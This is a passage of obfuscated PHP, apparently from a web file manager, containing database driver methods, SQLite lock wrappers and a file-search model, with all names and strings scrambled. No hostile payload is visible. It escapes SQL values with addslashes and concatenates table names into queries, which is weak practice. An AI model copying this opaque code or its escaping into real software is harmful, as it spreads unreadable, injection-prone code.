"\123\x45\x4c\105\103\x54\40\x20\40\x63\x6f\x6c\165\155\156\x5f\x6e\x61\x6d\x65\40\x61\163\x20\47\x4e\141\x6d\145\47\54\40\x20\x20\x64\x61\x74\141\137\164\171\x70\x65\x20\x61\x73\x20\x27\x54\x79\160\145\x27\54\x20\40\x20\x63\x6f\x6c\165\155\x6e\137\144\145\146\x61\x75\154\164\x20\x61\163\40\x27\104\145\x66\x61\165\154\x74\47\x2c\x20\40\40\151\x73\137\156\x75\154\154\141\x62\x6c\x65\x20\141\163\40\47\x4e\x75\154\x6c\47\xa\11\11\x46\122\x4f\x4d\11\x69\156\146\x6f\x72\155\x61\x74\151\x6f\156\x5f\163\143\x68\145\x6d\x61\56\x74\141\142\x6c\x65\x73\40\101\123\x20\164\12\x9\11\112\x4f\111\x4e\x9\x69\x6e\146\157\162\x6d\x61\164\x69\x6f\156\x5f\x73\x63\150\x65\x6d\141\56\143\x6f\154\x75\x6d\156\163\x20\101\123\40\143\xa\x9\11\117\x4e\40\40\164\x2e\x74\141\x62\154\145\137\143\141\164\141\x6c\x6f\147\40\75\40\x63\56\x74\x61\142\x6c\145\137\143\141\x74\x61\154\x6f\147\xa\x9\11\101\116\104\40\x74\56\164\x61\142\x6c\x65\x5f\x73\x63\x68\145\x6d\141\40\75\40\143\x2e\x74\141\142\154\145\137\x73\143\x68\x65\155\141\12\11\x9\101\x4e\x44\x20\164\x2e\x74\x61\142\154\145\137\x6e\x61\155\x65\40\x3d\40\x63\56\164\x61\142\x6c\145\x5f\x6e\x61\155\x65\xa\11\11\127\110\105\122\x45\x20\x20\x20\x74\56\x74\x61\x62\154\145\137\x6e\x61\x6d\x65\40\x3d\x20\x27{$á©Ïšê}\47"; break; case $±ú³ÀÊø[1023]: $ÀŞ¦Ÿ¼ = $±ú³ÀÊø[1024] . $á©Ïšê . $±ú³ÀÊø[1025]; break; case $±ú³ÀÊø[1005]: case $±ú³ÀÊø[1007]: $ÀŞ¦Ÿ¼ = $±ú³ÀÊø[1026] . $±ú³ÀÊø[1027] . $±ú³ÀÊø[1028] . strtoupper($á©Ïšê) . $±ú³ÀÊø[1029] . strtoupper($á©Ïšê) . $±ú³ÀÊø[1030]; break; case $±ú³ÀÊø[1031]: $ÀŞ¦Ÿ¼ = $±ú³ÀÊø[1032] . $á©Ïšê . $±ú³ÀÊø[1033]; break; case $±ú³ÀÊø[1006]: break; case $±ú³ÀÊø[1034]: default: $ÀŞ¦Ÿ¼ = $±ú³ÀÊø[1035] . ($this->dbType == $±ú³ÀÊø[1034] ? "\x60{$á©Ïšê}\x60" : $á©Ïšê); } } $Ì§æÜÂ… = $this->query($ÀŞ¦Ÿ¼); $¥Î¡¿åô = array(); if ($Ì§æÜÂ…) { foreach ($Ì§æÜÂ… as $åí•¦Ìê => $­­á†Ñğ) { $­­á†Ñğ = array_change_key_case($­­á†Ñğ); $­­á†Ñğ[$±ú³ÀÊø[32]] = isset($­­á†Ñğ[$±ú³ÀÊø[32]]) ? $­­á†Ñğ[$±ú³ÀÊø[32]] : $±ú³ÀÊø[457]; $­­á†Ñğ[$±ú³ÀÊø[33]] = isset($­­á†Ñğ[$±ú³ÀÊø[33]]) ? $­­á†Ñğ[$±ú³ÀÊø[33]] : $±ú³ÀÊø[457]; $¥±Ìäß™ = isset($­­á†Ñğ[$±ú³ÀÊø[353]]) ? $­­á†Ñğ[$±ú³ÀÊø[353]] : $­­á†Ñğ[$±ú³ÀÊø[32]]; $¥Î¡¿åô[$¥±Ìäß™] = array($±ú³ÀÊø[32] => $¥±Ìäß™, $±ú³ÀÊø[33] => $­­á†Ñğ[$±ú³ÀÊø[33]], $±ú³ÀÊø[35] => (bool) (isset($­­á†Ñğ[$±ú³ÀÊø[106]]) && $­­á†Ñğ[$±ú³ÀÊø[106]] === $±ú³ÀÊø[12] || isset($­­á†Ñğ[$±ú³ÀÊø[35]]) && $­­á†Ñğ[$±ú³ÀÊø[35]] === $±ú³ÀÊø[12]), $±ú³ÀÊø[37] => isset($­­á†Ñğ[$±ú³ÀÊø[37]]) ? $­­á†Ñğ[$±ú³ÀÊø[37]] : (isset($­­á†Ñğ[$±ú³ÀÊø[56]]) ? $­­á†Ñğ[$±ú³ÀÊø[56]] : $±ú³ÀÊø[457]), $±ú³ÀÊø[39] => isset($­­á†Ñğ[$±ú³ÀÊø[97]]) ? strtolower($­­á†Ñğ[$±ú³ÀÊø[97]]) == $±ú³ÀÊø[41] : (isset($­­á†Ñğ[$±ú³ÀÊø[57]]) ? $­­á†Ñğ[$±ú³ÀÊø[57]] : !1), $±ú³ÀÊø[42] => isset($­­á†Ñğ[$±ú³ÀÊø[1036]]) ? strtolower($­­á†Ñğ[$±ú³ÀÊø[1036]]) == $±ú³ÀÊø[44] : (isset($­­á†Ñğ[$±ú³ÀÊø[97]]) ? $­­á†Ñğ[$±ú³ÀÊø[97]] : !1)); } } return $¥Î¡¿åô; } public function getTables($«çÁ‡Ï¼ = '') { $Ş®¸™öƒ =& $_SERVER[«òÑğ]; if (think_config($Ş®¸™öƒ[1037])) { $…¯í®ùà = str_replace($Ş®¸™öƒ[1038], $«çÁ‡Ï¼, think_config($Ş®¸™öƒ[1037])); } else { switch ($this->dbType) { case $Ş®¸™öƒ[1005]: case $Ş®¸™öƒ[1007]: $…¯í®ùà = $Ş®¸™öƒ[1039]; break; case $Ş®¸™öƒ[1004]: case $Ş®¸™öƒ[1022]: $…¯í®ùà = $Ş®¸™öƒ[1040]; break; case $Ş®¸™öƒ[1031]: $…¯í®ùà = $Ş®¸™öƒ[1041]; break; case $Ş®¸™öƒ[1006]: think_exception(think_lang($Ş®¸™öƒ[1042]) . $Ş®¸™öƒ[1043]); break; case $Ş®¸™öƒ[1023]: $…¯í®ùà = $Ş®¸™öƒ[45] . $Ş®¸™öƒ[46] . $Ş®¸™öƒ[47]; break; case $Ş®¸™öƒ[1034]: default: if (!empty($«çÁ‡Ï¼)) { $…¯í®ùà = $Ş®¸™öƒ[986] . $«çÁ‡Ï¼ . $Ş®¸™öƒ[987]; } else { $…¯í®ùà = $Ş®¸™öƒ[988]; } } } $íüşÖé³ = $this->query($…¯í®ùà); $“¡‚©É¨ = array(); foreach ($íüşÖé³ as $¥©Ë£Û… => $Ö¶ºİ™Ó) { $“¡‚©É¨[$¥©Ë£Û…] = current($Ö¶ºİ™Ó); } return $“¡‚©É¨; } protected function parseLimit($»¤ı¯‹€) { $×÷İå¾ =& $_SERVER[«òÑğ]; $Ñî‚”ê” = $×÷İå¾[12]; if (!empty($»¤ı¯‹€)) { switch ($this->dbType) { case $×÷İå¾[1031]: case $×÷İå¾[1023]: $»¤ı¯‹€ = explode($×÷İå¾[50], $»¤ı¯‹€); if (count($»¤ı¯‹€) > 1) { $Ñî‚”ê” .= $×÷İå¾[51] . $»¤ı¯‹€[1] . $×÷İå¾[52] . $»¤ı¯‹€[0] . $×÷İå¾[53]; } else { $Ñî‚”ê” .= $×÷İå¾[51] . $»¤ı¯‹€[0] . $×÷İå¾[53]; } break; case $×÷İå¾[1004]: case $×÷İå¾[1022]: break; case $×÷İå¾[1006]: break; case $×÷İå¾[1005]: case $×÷İå¾[1007]: break; case $×÷İå¾[1034]: default: $Ñî‚”ê” .= $×÷İå¾[51] . $»¤ı¯‹€ . $×÷İå¾[53]; } } return $Ñî‚”ê”; } public function parseKey(&$ŸÙíá«§, $¼õëÌ‚ = true) { $ÃøÕñø– =& $_SERVER[«òÑğ]; if ($¼õëÌ‚) { $ŸÙíá«§ = $this->parseKeyCheck($ŸÙíá«§); } if ($this->dbType == $ÃøÕñø–[1034]) { if ($ŸÙíá«§ != $ÃøÕñø–[223] && !preg_match($ÃøÕñø–[998], $ŸÙíá«§)) { $ŸÙíá«§ = $ÃøÕñø–[464] . trim($ŸÙíá«§, $ÃøÕñø–[464]) . $ÃøÕñø–[464]; } return $ŸÙíá«§; } else { return parent::parseKey($ŸÙíá«§, $¼õëÌ‚); } } public function close() { $this->_linkID = null; } public function error() { $Ñ¼Åõù‹ =& $_SERVER[«òÑğ]; if ($this->PDOStatement) { $ŒŒÒ­Ä¿ = $this->PDOStatement->errorInfo(); $this->error = $ŒŒÒ­Ä¿[1] . $Ñ¼Åõù‹[4] . $ŒŒÒ­Ä¿[2]; } else { $this->error = $Ñ¼Åõù‹[12]; } if ($Ñ¼Åõù‹[12] != $this->queryStr) { $this->error .= LNG($Ñ¼Åõù‹[48]) . $this->queryStr; } think_trace($this->error, $Ñ¼Åõù‹[12], $Ñ¼Åõù‹[49]); return $this->error; } public function escapeString($¹Œ›“£) { $õ§¡á¿¡ =& $_SERVER[«òÑğ]; switch ($this->dbType) { case $õ§¡á¿¡[1031]: case $õ§¡á¿¡[1004]: case $õ§¡á¿¡[1022]: case $õ§¡á¿¡[1034]: return addslashes($¹Œ›“£); case $õ§¡á¿¡[1006]: case $õ§¡á¿¡[1023]: case $õ§¡á¿¡[1005]: case $õ§¡á¿¡[1007]: return str_ireplace($õ§¡á¿¡[58], $õ§¡á¿¡[59], $¹Œ›“£); } } protected function parseValue($”«õôë) { $½ı¨§ÖË =& $_SERVER[«òÑğ]; if (is_string($”«õôë)) { $Î…Ş’© = strpos($”«õôë, $½ı¨§ÖË[4]) === 0 && in_array($”«õôë, array_keys($this->bind)); $”«õôë = $Î…Ş’© ? $this->escapeString($”«õôë) : $½ı¨§ÖË[1044] . $this->escapeString($”«õôë) . $½ı¨§ÖË[1044]; } elseif (isset($”«õôë[0]) && is_string($”«õôë[0]) && strtolower($”«õôë[0]) == $½ı¨§ÖË[375]) { $”«õôë = $this->escapeString($”«õôë[1]); } elseif (is_array($”«õôë)) { $”«õôë = array_map(array($this, $½ı¨§ÖË[1045]), $”«õôë); } elseif (is_bool($”«õôë)) { $”«õôë = $”«õôë ? $½ı¨§ÖË[91] : $½ı¨§ÖË[231]; } elseif (is_null($”«õôë)) { $”«õôë = $½ı¨§ÖË[106]; } return $”«õôë; } public function getLastInsertId() { $”é«úû =& $_SERVER[«òÑğ]; switch ($this->dbType) { case $”é«úû[1031]: case $”é«úû[1023]: case $”é«úû[1004]: case $”é«úû[1022]: case $”é«úû[1006]: case $”é«úû[1034]: return $this->_linkID->lastInsertId(); case $”é«úû[1005]: case $”é«úû[1007]: $êÜº€şá = $this->table; $ÖŒˆ—¤ˆ = $this->query("\x53\x45\x4c\x45\x43\x54\40{$êÜº€şá}\x2e\143\165\x72\162\x76\141\x6c\x20\143\x75\x72\x72\166\x61\154\x20\x46\122\117\x4d\x20\x64\165\141\x6c"); return $ÖŒˆ—¤ˆ ? $ÖŒˆ—¤ˆ[0][$”é«úû[1046]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($·êôà×) { $Ô…ÛÙÜ =& $_SERVER[«òÑğ]; if (!CacheLock::fileLock($Ô…ÛÙÜ[13])) { return !1; } $ñıïäĞ = parent::query($·êôà×); CacheLock::fileUnLock($Ô…ÛÙÜ[13]); return $ñıïäĞ; } public function execute($êÄëÉª‡) { $ñ¸¿™§Í =& $_SERVER[«òÑğ]; if (!CacheLock::fileLock($ñ¸¿™§Í[13])) { return !1; } $ƒ·¦à¹ = parent::execute($êÄëÉª‡); CacheLock::fileUnLock($ñ¸¿™§Í[13]); return $ƒ·¦à¹; } } class DbSqlite3 extends DbSqlite3Base { public function query($ÈÇ¨ù¶) { $öÇáé° =& $_SERVER[«òÑğ]; if (!CacheLock::fileLock($öÇáé°[13])) { return !1; } $½¸’˜ÀÌ = parent::query($ÈÇ¨ù¶); CacheLock::fileUnLock($öÇáé°[13]); return $½¸’˜ÀÌ; } public function execute($†İËì¢¬) { $”İÄ­Œí =& $_SERVER[«òÑğ]; if (!CacheLock::fileLock($”İÄ­Œí[13])) { return !1; } $İêƒĞÔ = parent::execute($†İËì¢¬); CacheLock::fileUnLock($”İÄ­Œí[13]); return $İêƒĞÔ; } } goto C¯…øƒÍ; ašº›ó·: class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($ô¶«èŠ©) { $¿ƒ¬€‹¡ =& $_SERVER[«òÑğ]; $ĞÓ™€ÃÚ = KodIO::fileTypeList(); $«•µı¥“ = $ĞÓ™€ÃÚ[$ô¶«èŠ©]; if (!$«•µı¥“) { return array(); } $ÃÊİı˜Á = $«•µı¥“[$¿ƒ¬€‹¡[169]]; $—ƒ”¿†œ = $¿ƒ¬€‹¡[7]; if (!$«•µı¥“[$¿ƒ¬€‹¡[169]]) { $×ÆõĞ¼Â = array_to_keyvalue($ĞÓ™€ÃÚ, $¿ƒ¬€‹¡[12], $¿ƒ¬€‹¡[169]); $ÃÊİı˜Á = implode($¿ƒ¬€‹¡[50], $×ÆõĞ¼Â); $—ƒ”¿†œ = $¿ƒ¬€‹¡[2252]; } $¬¸æ”¦³ = explode($¿ƒ¬€‹¡[50], trim($ÃÊİı˜Á, $¿ƒ¬€‹¡[50])); return array($—ƒ”¿†œ, $¬¸æ”¦³); } public function listPathType($‡ÖššÛ¿) { $ÊøíÄ›— =& $_SERVER[«òÑğ]; $˜––—ÓÔ = $this->fileTypeWhere($‡ÖššÛ¿); if (!$˜––—ÓÔ) { return array(); } $¢ôİêûç = USER_ID; $Åª©¦Áì = Model($ÊøíÄ›—[602])->getInfo($¢ôİêûç); $Ò©´«Í¡ = array($ÊøíÄ›—[656] => SourceModel::TYPE_USER, $ÊøíÄ›—[589] => array($ÊøíÄ›—[620], $ÊøíÄ›—[598] . $Åª©¦Áì[$ÊøíÄ›—[90]][$ÊøíÄ›—[194]] . $ÊøíÄ›—[621]), $ÊøíÄ›—[657] => $¢ôİêûç, $ÊøíÄ›—[654] => 0, $ÊøíÄ›—[655] => $˜––—ÓÔ); return $this->listSource($Ò©´«Í¡); } public function listSearch($‹ò›äÀ¶, $„ ½ã”÷ = 300) { $ûË“ÛÎ =& $_SERVER[«òÑğ]; if (isset($‹ò›äÀ¶[$ûË“ÛÎ[2083]]) && $‹ò›äÀ¶[$ûË“ÛÎ[2083]]) { $‹ò›äÀ¶[$ûË“ÛÎ[2083]] = str_replace($ûË“ÛÎ[463], $ûË“ÛÎ[2253], trim($‹ò›äÀ¶[$ûË“ÛÎ[2083]])); } $¨ì±÷“ = $this->_parseSearchWhere($‹ò›äÀ¶); if (!isset($¨ì±÷“[$ûË“ÛÎ[508]])) { $¨ì±÷“[$ûË“ÛÎ[508]] = 0; } $¼œ«èë = $ûË“ÛÎ[2254]; $´Éñ›•Ó = $¨ì±÷“; $¸Œ»Ìøµ = $¼œ«èë; $this->_listSearchBindPinyin($‹ò›äÀ¶, $¨ì±÷“, $¼œ«èë); $this->alias($ûË“ÛÎ[522])->_makeOrder(); $¨ì±÷“ = $this->parseWhereLike($¨ì±÷“); $ÇÆ±÷ = $this->distinct(!0)->field($¼œ«èë)->where($¨ì±÷“)->selectPage($„ ½ã”÷); if ($GLOBALS[$ûË“ÛÎ[6]][$ûË“ÛÎ[460]][$ûË“ÛÎ[461]] && Input::check($‹ò›äÀ¶[$ûË“ÛÎ[2083]], $ûË“ÛÎ[663]) && $ÇÆ±÷[$ûË“ÛÎ[445]][$ûË“ÛÎ[431]] == 1 && $ÇÆ±÷[$ûË“ÛÎ[445]][$ûË“ÛÎ[446]] == 0) { $ÇÆ±÷ = $this->distinct(!0)->field($¼œ«èë)->where($´Éñ›•Ó)->limit(1000)->select(); $ÇÆ±÷ = array_page_split($ÇÆ±÷, !1, $„ ½ã”÷); } $this->_listSearchFileContent($ÇÆ±÷, $‹ò›äÀ¶, $¸Œ»Ìøµ, $´Éñ›•Ó); $this->_listSearchDesc($ÇÆ±÷, $‹ò›äÀ¶, $¸Œ»Ìøµ); $this->_listSearchTag($ÇÆ±÷, $‹ò›äÀ¶, $¸Œ»Ìøµ); $this->_listSearchGroupTag($ÇÆ±÷, $‹ò›äÀ¶, $¸Œ»Ìøµ); $this->_listDataApply($ÇÆ±÷[$ûË“ÛÎ[448]]); $this->_listMake($ÇÆ±÷); return $ÇÆ±÷; } private function _listSearchFileContent(&$‡âàÂå, $¡÷¹¤†, $¡ªŠ ì„, $¶É£”±€) { $Áµçé´ı =& $_SERVER[«òÑğ]; if (!$¡÷¹¤†[$Áµçé´ı[2083]] || $‡âàÂå[$Áµçé´ı[445]][$Áµçé´ı[431]] > 1) { return; } if (!isset($¶É£”±€[$Áµçé´ı[32]]) || !is_array($¡÷¹¤†[$Áµçé´ı[546]])) { return; } $¶É£”±€[$Áµçé´ı[546]] = array($Áµçé´ı[7], $¡÷¹¤†[$Áµçé´ı[546]]); unset($¶É£”±€[$Áµçé´ı[32]]); unset($¡÷¹¤†[$Áµçé´ı[546]]); $±¬±ïãç = $this->field($¡ªŠ ì„)->where($¶É£”±€)->limit($Áµçé´ı[2255])->select(); if (!$±¬±ïãç || count($±¬±ïãç) == 0) { return; } $‡âàÂå[$Áµçé´ı[448]] = array_merge($±¬±ïãç, $‡âàÂå[$Áµçé´ı[448]]); $‡âàÂå[$Áµçé´ı[445]][$Áµçé´ı[446]] += count($±¬±ïãç); } private function _listSearchTag(&$øéğóõÃ, $ÁÛ”Í­Ë, $Ëßğ‡ä¤) { $ÔË¿ÕÅ =& $_SERVER[«òÑğ]; if (!isset($ÁÛ”Í­Ë[$ÔË¿ÕÅ[2256]])) { return; } if (!$ÁÛ”Í­Ë[$ÔË¿ÕÅ[2083]] || $øéğóõÃ[$ÔË¿ÕÅ[445]][$ÔË¿ÕÅ[431]] > 1) { return; } $ŒÑ²œ“ú = Model($ÔË¿ÕÅ[2257])->listData(); $¾ĞÉàÀ¯ = array(); $Ş©¾¢‰ = $ÁÛ”Í­Ë[$ÔË¿ÕÅ[2083]]; foreach ($ŒÑ²œ“ú as $Äš³Ù¥) { $È–â¨É = $Äš³Ù¥[$ÔË¿ÕÅ[32]]; $ä«Âˆ¥“ = str_replace($ÔË¿ÕÅ[53], $ÔË¿ÕÅ[12], Pinyin::get($È–â¨É)); if (stripos($È–â¨É, $Ş©¾¢‰) !== !1 || stripos($ä«Âˆ¥“, $Ş©¾¢‰) !== !1) { $¾ĞÉàÀ¯[] = $Äš³Ù¥[$ÔË¿ÕÅ[478]]; } } if (!$¾ĞÉàÀ¯) { return; } $­»–îâ‡ = array($ÔË¿ÕÅ[503] => array($ÔË¿ÕÅ[7], $¾ĞÉàÀ¯), $ÔË¿ÕÅ[1784] => USER_ID); $ˆØ·õ¬‰ = Model($ÔË¿ÕÅ[505])->field($ÔË¿ÕÅ[87])->where($­»–îâ‡)->select(); $ˆØ·õ¬‰ = array_to_keyvalue($ˆØ·õ¬‰, $ÔË¿ÕÅ[12], $ÔË¿ÕÅ[87]); $ãÚÉû¿Ä = array_unique($ˆØ·õ¬‰); $this->_listSearchMerge($øéğóõÃ, $ÁÛ”Í­Ë, $Ëßğ‡ä¤, $ãÚÉû¿Ä); } private function _listSearchDesc(&$½–£œæÁ, $÷çÓıµŸ, $ãÙÄ¤£) { $›·ÓÙÛ‹ =& $_SERVER[«òÑğ]; if (!isset($÷çÓıµŸ[$›·ÓÙÛ‹[529]])) { return; } if (!$÷çÓıµŸ[$›·ÓÙÛ‹[2083]] || $½–£œæÁ[$›·ÓÙÛ‹[445]][$›·ÓÙÛ‹[431]] > 1) { return; } $ÒÄß«‡ = array($›·ÓÙÛ‹[97] => $›·ÓÙÛ‹[529], $›·ÓÙÛ‹[453] => array($›·ÓÙÛ‹[462], $›·ÓÙÛ‹[2085] . $÷çÓıµŸ[$›·ÓÙÛ‹[2083]] . $›·ÓÙÛ‹[2085])); $—õÉ‰—¢ = !1; if ($—õÉ‰—¢) { $Ü‡‰Ñç× = $this->listSearchChildren($÷çÓıµŸ[$›·ÓÙÛ‹[193]]); $Ü‡‰Ñç× = array_unique($Ü‡‰Ñç×); if (!$Ü‡‰Ñç×) { return; } $ÒÄß«‡[$›·ÓÙÛ‹[194]] = array($›·ÓÙÛ‹[7], $Ü‡‰Ñç×); } $äÍ«â÷ä = Model($›·ÓÙÛ‹[640])->field($›·ÓÙÛ‹[194])->where($ÒÄß«‡)->limit(5000)->select(); $èö³şßØ = array_to_keyvalue($äÍ«â÷ä, $›·ÓÙÛ‹[12], $›·ÓÙÛ‹[194]); $this->_listSearchMerge($½–£œæÁ, $÷çÓıµŸ, $ãÙÄ¤£, $èö³şßØ); } private function _listSearchGroupTag(&$ˆµèœâĞ, $ÇŒíïğˆ, $Œ›ˆê´) { $”ö¥¦’ú =& $_SERVER[«òÑğ]; if (!isset($ÇŒíïğˆ[$”ö¥¦’ú[2256]])) { return; } if (!$ÇŒíïğˆ[$”ö¥¦’ú[2083]] || $ˆµèœâĞ[$”ö¥¦’ú[445]][$”ö¥¦’ú[431]] > 1 || !$ÇŒíïğˆ[$”ö¥¦’ú[193]]) { return; } $¢â‹µ² = $this->sourceInfo($ÇŒíïğˆ[$”ö¥¦’ú[193]]); if (!$¢â‹µ² || $¢â‹µ²[$”ö¥¦’ú[191]] != SourceModel::TYPE_GROUP) { return; } $§ Á”¨Ê = $¢â‹µ²[$”ö¥¦’ú[574]]; $’¾úè½ = Model($”ö¥¦’ú[2258])->get($§ Á”¨Ê); $ç›‘¥©İ = array(); $ú‰ˆŞÌ¬ = $ÇŒíïğˆ[$”ö¥¦’ú[2083]]; foreach ($’¾úè½[$”ö¥¦’ú[448]] as $í°ã¿Ñü) { $«…“˜Ü¸ = $í°ã¿Ñü[$”ö¥¦’ú[32]]; $É€•±ùğ = str_replace($”ö¥¦’ú[53], $”ö¥¦’ú[12], Pinyin::get($«…“˜Ü¸)); if (stripos($«…“˜Ü¸, $ú‰ˆŞÌ¬) !== !1 || stripos($É€•±ùğ, $ú‰ˆŞÌ¬) !== !1) { $ç›‘¥©İ[] = $í°ã¿Ñü[$”ö¥¦’ú[478]]; } } if (!$ç›‘¥©İ) { return; } $¾×„ìş = array($”ö¥¦’ú[503] => array($”ö¥¦’ú[7], $ç›‘¥©İ), $”ö¥¦’ú[1784] => 0, $”ö¥¦’ú[33] => $”ö¥¦’ú[2105] . $§ Á”¨Ê); $ú ¦ÄÇÉ = Model($”ö¥¦’ú[505])->field($”ö¥¦’ú[87])->where($¾×„ìş)->select(); $ú ¦ÄÇÉ = array_to_keyvalue($ú ¦ÄÇÉ, $”ö¥¦’ú[12], $”ö¥¦’ú[87]); $Š“îà¢ù = array_unique($ú ¦ÄÇÉ); $this->_listSearchMerge($ˆµèœâĞ, $ÇŒíïğˆ, $Œ›ˆê´, $Š“îà¢ù); } private function _listSearchMerge(&$–—ÖŠ¥Û, $´¥Íßú†, $§øº¥ß , $»ïı•œù) { $úÃğÖ¶¬ =& $_SERVER[«òÑğ]; if (!$»ïı•œù) { return; } $ÙÈµÀÚ = array_to_keyvalue($–—ÖŠ¥Û[$úÃğÖ¶¬[448]], $úÃğÖ¶¬[12], $úÃğÖ¶¬[194]); $çßóÌÓñ = array_diff($»ïı•œù, $ÙÈµÀÚ); if (!$çßóÌÓñ) { return; } $Æ’……‘ú = array($úÃğÖ¶¬[194] => array($úÃğÖ¶¬[7], $çßóÌÓñ)); $ÌÖÛúÍ = $this->field($§øº¥ß )->where($Æ’……‘ú)->select(); if (!$ÌÖÛúÍ) { return; } $½¼¯Ûèº = array(); foreach ($ÌÖÛúÍ as $–Øòä—») { if ($this->_listSearchFilter($–Øòä—», $´¥Íßú†)) { $½¼¯Ûèº[] = $–Øòä—»; } } $–—ÖŠ¥Û[$úÃğÖ¶¬[448]] = array_merge($½¼¯Ûèº, $–—ÖŠ¥Û[$úÃğÖ¶¬[448]]); $–—ÖŠ¥Û[$úÃğÖ¶¬[445]][$úÃğÖ¶¬[446]] += count($½¼¯Ûèº); } private function _listSearchFilter($Úı•ö÷ê, $š¼ò¤ÊŞ) { $êÖåœñ° =& $_SERVER[«òÑğ]; $ÑÎ¿ôŒŠ = $Úı•ö÷ê[$êÖåœñ°[488]] == $êÖåœñ°[91]; if (!strstr($Úı•ö÷ê[$êÖåœñ°[589]], $êÖåœñ°[50] . $š¼ò¤ÊŞ[$êÖåœñ°[193]] . $êÖåœñ°[50])) { return !1; } if (isset($š¼ò¤ÊŞ[$êÖåœñ°[489]]) && $š¼ò¤ÊŞ[$êÖåœñ°[489]] != $êÖåœñ°[860]) { if ($š¼ò¤ÊŞ[$êÖåœñ°[489]] == $êÖåœñ°[78] && !$ÑÎ¿ôŒŠ) { return !1; } if ($š¼ò¤ÊŞ[$êÖåœñ°[489]] != $êÖåœñ°[78] && $ÑÎ¿ôŒŠ) { return !1; } if (!strstr($Úı•ö÷ê[$êÖåœñ°[169]], $êÖåœñ°[50] . $š¼ò¤ÊŞ[$êÖåœñ°[489]] . $êÖåœñ°[50])) { return !1; } } if (isset($š¼ò¤ÊŞ[$êÖåœñ°[2259]]) && $š¼ò¤ÊŞ[$êÖåœñ°[2259]] < $Úı•ö÷ê[$êÖåœñ°[79]]) { return !1; } if (isset($š¼ò¤ÊŞ[$êÖåœñ°[2260]]) && $š¼ò¤ÊŞ[$êÖåœñ°[2260]] > $Úı•ö÷ê[$êÖåœñ°[79]]) { return !1; } if (isset($š¼ò¤ÊŞ[$êÖåœñ°[670]]) && $š¼ò¤ÊŞ[$êÖåœñ°[670]] != $Úı•ö÷ê[$êÖåœñ°[532]]) { return !1; } return !0; } public function listSearchChildren($±’Á¸†, $¬úğîÎç = 5000) { $Àó¼¬Üº =& $_SERVER[«òÑğ]; $Îú‰÷æ¿ = array(); $Äæ™ø‘ë = $this->sourceInfo($±’Á¸†); $¾ì¨Ã = array($Àó¼¬Üº[589] => array($Àó¼¬Üº[462], $Äæ™ø‘ë[$Àó¼¬Üº[589]] . $Äæ™ø‘ë[$Àó¼¬Üº[194]] . $Àó¼¬Üº[621])); $È×‹¤² = $this->field($Àó¼¬Üº[79])->where($¾ì¨Ã)->limit($¬úğîÎç + 1)->select(); $£×™šÚ = is_array($È×‹¤²) ? count($È×‹¤²) : 0; if ($£×™šÚ > $¬úğîÎç) { return $this->_listSearchChildrenNear($±’Á¸†, $¬úğîÎç); } $ÉõŒ£çù = $this->field($Àó¼¬Üº[194])->where($¾ì¨Ã)->select(); $Îú‰÷æ¿ = array_to_keyvalue($ÉõŒ£çù, $Àó¼¬Üº[12], $Àó¼¬Üº[194]); return $Îú‰÷æ¿; } private function _listSearchChildrenNear($‰ı¯µØ, $ˆ¨æ¢¹ş) { $òÚÍú® =& $_SERVER[«òÑğ]; $İ»ßò÷ = array(); $Ãƒ·ÈĞÅ = array($òÚÍú®[193] => $‰ı¯µØ); $»¾î±¿¼ = $this->field($òÚÍú®[2261])->where($Ãƒ·ÈĞÅ)->select(); $Å»°’´™ = array_to_keyvalue(array_filter_by_field($»¾î±¿¼, $òÚÍú®[488], $òÚÍú®[91]), $òÚÍú®[12], $òÚÍú®[194]); $İ»ßò÷ = array_merge($İ»ßò÷, array_to_keyvalue($»¾î±¿¼, $òÚÍú®[12], $òÚÍú®[194])); if (!$Å»°’´™) { return $İ»ßò÷; } $Ãƒ·ÈĞÅ = array($òÚÍú®[193] => array($òÚÍú®[7], $Å»°’´™)); $»¾î±¿¼ = $this->field($òÚÍú®[2261])->where($Ãƒ·ÈĞÅ)->limit($ˆ¨æ¢¹ş)->select(); $İ»ßò÷ = array_merge($İ»ßò÷, array_to_keyvalue($»¾î±¿¼, $òÚÍú®[12], $òÚÍú®[194])); $İ»ßò÷ = array_slice($İ»ßò÷, 0, intval($ˆ¨æ¢¹ş)); return $İ»ßò÷; } private function _listSearchBindPinyin($Æ¼³Ê¾¸, &$çüµëë, &$ß£ÕÕ) { $©«¦Ñ–é =& $_SERVER[«òÑğ]; if (!isset($Æ¼³Ê¾¸[$©«¦Ñ–é[2083]]) || !$Æ¼³Ê¾¸[$©«¦Ñ–é[2083]]) { return; } if (!Input::check($Æ¼³Ê¾¸[$©«¦Ñ–é[2083]], $©«¦Ñ–é[396]) || strlen($Æ¼³Ê¾¸[$©«¦Ñ–é[2083]]) < 2) { return; } $¸Èñã‰Ç = "\114\x45\x46\124\40\x4a\x4f\x49\x4e\x20{$this->tablePrefix}\151\157\x5f\x73\157\165\162\x63\x65\x5f\x6d\x65\164\141\40\155\145\x74\x61\40\x6f\156\x20\x73\x6f\x75\x72\x63\x65\56\x73\x6f\165\x72\x63\145\x49\x44\40\75\x20\x6d\x65\x74\141\x2e\163\157\x75\x72\143\145\111\104"; $ÀÖ”Šò‰ = array(); $ß£ÕÕ = str_replace(array($©«¦Ñ–é[288], $©«¦Ñ–é[53], $©«¦Ñ–é[2262]), $©«¦Ñ–é[12], $ß£ÕÕ); $ß£ÕÕ = $©«¦Ñ–é[514] . str_replace($©«¦Ñ–é[50], $©«¦Ñ–é[515], $ß£ÕÕ); $ äÙÅ­ì = $çüµëë[$©«¦Ñ–é[32]]; unset($çüµëë[$©«¦Ñ–é[32]]); foreach ($çüµëë as $£­«¿Ü => $³ãİş…Á) { $ÀÖ”Šò‰[$©«¦Ñ–é[514] . $£­«¿Ü] = $³ãİş…Á; } foreach ($ äÙÅ­ì as $•á œÎ) { $ÀÖ”Šò‰[] = array($©«¦Ñ–é[519] => $•á œÎ, $©«¦Ñ–é[1087] => $©«¦Ñ–é[2087], array($©«¦Ñ–é[2263] => $•á œÎ, $©«¦Ñ–é[2264] => array($©«¦Ñ–é[7], array($©«¦Ñ–é[541], $©«¦Ñ–é[540])))); } $this->join($¸Èñã‰Ç); $çüµëë = $ÀÖ”Šò‰; } private function _parseSearchWhere($î‚é³ó€) { $–½˜Â¶¶ =& $_SERVER[«òÑğ]; $–¡üÆ” = array(); if (isset($î‚é³ó€[$–½˜Â¶¶[844]]) && $î‚é³ó€[$–½˜Â¶¶[844]]) { $–¡üÆ”[$–½˜Â¶¶[88]] = array($–½˜Â¶¶[2265], 